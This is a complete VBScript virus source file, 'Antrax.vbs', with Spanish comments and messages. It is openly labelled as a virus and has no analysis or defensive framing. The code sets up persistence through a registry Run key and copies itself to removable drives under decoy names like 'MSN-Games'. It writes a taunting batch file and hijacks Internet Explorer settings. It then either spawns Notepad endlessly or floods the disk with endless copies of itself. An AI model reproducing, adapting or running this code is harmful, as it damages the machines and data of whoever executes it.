'Inicio Virus Antrax.vbs
On Error Resume Next
Set File = CreateObject("scripting.filesystemobject")
Set regedit = CreateObject("WScript.Shell")
Y = 0
main()

Function main()
 File.CopyFile wscript.scriptFullName, "C:\Antrax.vbs"
 reg = regedit.regwrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Antrax", "C:\Antrax.vbs")
 copy()
End Function

Function copy()
 Randomize
 Num = Int((Rnd * 4) + 1)
 If Num = 1 Then Name = "Antrax"
 If Num = 2 Then Name = "BillGates"
 If Num = 3 Then Name = "MSN-Games"
 If Num = 4 Then Name = "Messenger"
 File.CopyFile wscript.scriptFullName, "A:\" & Name & ".vbs"
 msn()
End Function

Function msn()
 Reg = regedit.regwrite("HKLM\Software\Microsoft\MessengerService\Policies\IMWarning","Antrax ---> Realmente hoy es un buen dia")
 createbat()
End Function

Function createbat()
 Set Pro = File.CreateTextFile("C:\Antrax.bat", True)
  Pro.WriteLine("@echo off")
  Pro.WriteLine("echo.En estos momentos tu ordenador esta infectado con el virus: Antrax.vbs")
  Pro.WriteLine("echo.Lo mas seguro esque tu Internet Explorer este infectado y tengo que")
  Pro.WriteLine("echo.advertirte que te compres un disco duro nuevo, ya que el que tienes ahora")
  Pro.WriteLine("echo.lo estoy rellenando con archivos inutiles.")
  Pro.WriteLine("pause")
  Pro.WriteLine("cls")
  Pro.WriteLine("echo.Adios, recive un cordial saludo de: Antrax")
  Pro.WriteLine("echo.REALMENTE HOY ES UN BUEN DIA")
 Pro.Close
 internet()
End Function

Function internet()
 Reg = regedit.RegWrite("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","javascript:alert(" & Chr(34) & "Hoy es un buen dia!!  :-)" & Chr(34) & ")")
 Reg = regedit.RegWrite("HKCU\Software\Microsoft\Internet Explorer\Main\Window title","Programa infectado con ANTRAX")
 flood()
End Function

Function flood()
 Dia = Int(Month(Now) + Day(Now))
 If Dia = 13 Then
  Do
   Regedit.Run "%windir%\Notepad.exe"
  Loop
 Else
  Do
   Randomize
   Var = Int((Rnd * 4) + 1)
   If Var = 1 Then Ext = ".bmp"
   If Var = 2 Then Ext = ".com"
   If Var = 3 Then Ext = ".dll"
   If Var = 4 Then Ext = ".bat"
   File.CopyFile wscript.scriptFullName, "C:\Windows\Escritorio\Pruevas\" & Y & Ext
   Y = Y + 1
  Loop
 End If
End Function
'HOY ES UN BUEN DIA
'Fin Virus Antrax.vbs